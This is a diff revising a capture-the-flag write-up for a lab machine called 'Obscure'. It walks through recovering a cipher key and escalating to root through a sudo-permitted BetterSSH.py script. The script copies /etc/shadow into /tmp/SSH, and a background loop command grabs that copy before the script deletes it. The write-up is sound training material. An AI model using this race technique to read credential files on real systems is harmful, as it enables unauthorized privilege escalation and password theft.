@@ -508,7 +508,10 @@ In words:
 - and `encrypted` decrypted with `key` = `text`,
 - then `encrypted` decrypted with `decrypted` = `key`.
 
-We have our `text` (`check.txt`), and we have our `encrypted` (`out.txt`) - we can absolutely do this. But before we do it, let's take a look at the program's arguments (i.e. how it accepts input):
+In action:
+- We can get the real `key` if we decrypt our `encrypted` (`out.txt`) using our `decrypted` (`check.txt`) as our `key`.
+  
+But before we do it, let's take a look at the program's arguments (i.e. how it accepts input):
 ```
 parser.add_argument('-i',
                     metavar='InFile',
@@ -530,11 +533,11 @@ parser.add_argument('-k',
 
 parser.add_argument('-d', action='store_true', help='Decrypt mode')
 ```
-That means,
-- `-i` is where we put the *filename* that contains our `text` --> `out.txt`
-- `-o` is where we put the filename that contains our output (whether `encrypted` or `decrypted`) --> `key.txt`
-- `-k` is where we put the *string* that represents our `key` --> contents of `check.txt`
-- `-d` activates 'Decrypt mode' - this is crucial! We need to *decrypt* to get our `key` --> make sure to include `-d`
+In words,
+- `-i` --> the *filename* that contains our `text` --> `out.txt`
+- `-o` --> the filename to write our output --> let's go with `key.txt`
+- `-k` --> the *string* that represents our `key` --> the *contents* of `check.txt`
+- `-d` --> activates 'Decrypt mode' --> since we need to `decrypt`, we need to include `-d`
   
 Now let's put this in action:
 ```
@@ -587,9 +590,9 @@ Grab user.txt here.
 
 ### Priv: robert -> root
 
-Getting root from here on involves another round of reversing and some devious bash techniques. Don't be disheartened! We're nearly there.
+Getting root from here on involves another round of reversing and some devious bash techniques.
 
-Now remember we left out `BetterSSH` earlier? It now becomes relevant. Because if we do a `sudo -l`...
+First, some basic enumeration should show you that `robert` can do a restricted `sudo` with python3 to run `BetterSSH.py`.
 ```
 robert@obscure:~$ sudo -l
 Matching Defaults entries for robert on obscure:
@@ -598,9 +601,7 @@ Matching Defaults entries for robert on obscure:
 User robert may run the following commands on obscure:
     (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
 ```
-...we see that `robert` can do a restricted `sudo` with python3 to run `BetterSSH.py`. Obviously this is the intended way to do the box, so let's look inside `BetterSSH.py`.
-  
-(If you're tired of reversing by now, have heart! We're nearly there!)
+Let's look inside `BetterSSH.py`.
 ```
 robert@obscure:~/BetterSSH$ cat BetterSSH.py 
 import sys
@@ -669,7 +670,7 @@ if session['authenticated'] == 1:
         print('Error: '  + e.decode('ascii')) if len(e.decode('ascii')) > 0 else print('')
 ```
 
-Reading the code, immediately we can disregard the complicated parts, and really look for weird behaviours wired into the program. And if you did look into that, you should immediately notice this _really_ weird behaviour:
+If we disregard the complicated parts, and simply try to notice weird behaviours wired into the program, sooner or later, you should notice this _really_ weird behaviour:
 ```
     with open('/etc/shadow', 'r') as f:
         data = f.readlines()
@@ -699,7 +700,7 @@ drwx------ 3 root     root     4096 May 29 06:30 systemd-private-c11b72588eae44a
 drwx------ 2 root     root     4096 May 29 06:30 vmware-root_622-2689275054
 ```
 
-We see no hint of a `/SSH` folder in `/tmp`. And if we complete the authentication process, we see that the program outputs an error indicating that it failed to locate `/tmp/SSH`. 
+So in our other SSH session, we see no hint of a `/SSH` folder in `/tmp` while in the midst of `BetterSSH`'s authentication process. And if we complete the authentication process, we see that the program outputs an error indicating that it failed to locate `/tmp/SSH`. 
 ```
 robert@obscure:~/BetterSSH$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
 Enter username: a
@@ -724,7 +725,7 @@ Enter password: a
 Invalid user
 ```
 But still, if we tried to delay the authentication process (e.g. by entering only username), we can't see anything in the `/tmp/SSH` folder with our second terminal (you can try). 
-
+  
 However if we looked at the timestamp of the `/tmp/SSH` folder, we can verify that the `/tmp/SSH` folder is 'touched' when `BetterSSH.py` is run:
 ```
 robert@obscure:~$ ls -l /tmp
@@ -736,14 +737,14 @@ drwx------ 3 root     root     4096 May 29 06:30 systemd-private-c11b72588eae44a
 -rw-rw-r-- 1 robert   robert      0 May 29 10:18 test.txt
 drwx------ 2 root     root     4096 May 29 06:30 vmware-root_622-2689275054
 ```
-Check: `10:46`. Run the program:
+Check timestamp: `10:46`. Run the program:
 ```
 robert@obscure:~/BetterSSH$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
 Enter username: a
 Enter password: a
 Invalid user
 ```
-Check:
+Check timestamp again...
 ```
 robert@obscure:~$ ls -l /tmp
 total 16
@@ -754,13 +755,15 @@ drwx------ 3 root     root     4096 May 29 06:30 systemd-private-c11b72588eae44a
 -rw-rw-r-- 1 robert   robert      0 May 29 10:18 test.txt
 drwx------ 2 root     root     4096 May 29 06:30 vmware-root_622-2689275054
 ```
-Check: `10:53`. We can confirm that `/tmp/SSH` was 'touched' by `BetterSSH.py`.
+...`10:53`. We can confirm that `/tmp/SSH` was 'touched' by `BetterSSH.py`.
 
 So what we now have here is a race with `BetterSSH.py`: we need to grab the copy of `/etc/shadow` created in `/tmp/SSH` before `BetterSSH.py` deletes it.
 
 Can we do that? Absolutely! 
 
-First, let's create a perpetual loop that would constantly copy everything from `/tmp/SSH/` to a convenient directory of our choosing, say `/home/robert/net`. (Because this loop is the `net` that will catch our `fish' ;))
+First, let's create a perpetual loop that would constantly copy everything from `/tmp/SSH/` to a convenient directory of our choosing, say `/home/robert/net`. (Because this loop is the `net` that will catch our `fish` ;))
+
+Our `net` will look like this: `while true;do cp -r /tmp/SSH /home/robert/net;done &` (FYI, the `&` at the end of the command backgrounds our command):
 ```
 robert@obscure:~$ mkdir net
 robert@obscure:~$ ls -l
@@ -775,9 +778,9 @@ drwxrwxr-x 2 robert robert 4096 May 29 10:58 net
 robert@obscure:~$ while true;do cp -r /tmp/SSH /home/robert/net;done &
 [1] 28190
 ```
-Note: The `&` at the end of the command turns it into a background process. `[1] 28190` is the `pid` of our backgrounded command.
+`[1] 28190` is the `pid` of our backgrounded command. Our net is ready.
 
-Second, we run `BetterSSH.py`:
+We run `BetterSSH.py`:
 ```
 robert@obscure:~/BetterSSH$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
 Enter username: a
@@ -786,7 +789,7 @@ Invalid user
 ```
 (Yes, you don't even need to enter correct credentials!)
 
-Third, let's check our 'net':
+Let's check our 'net':
 ```
 robert@obscure:~$ ls -l net
 total 4
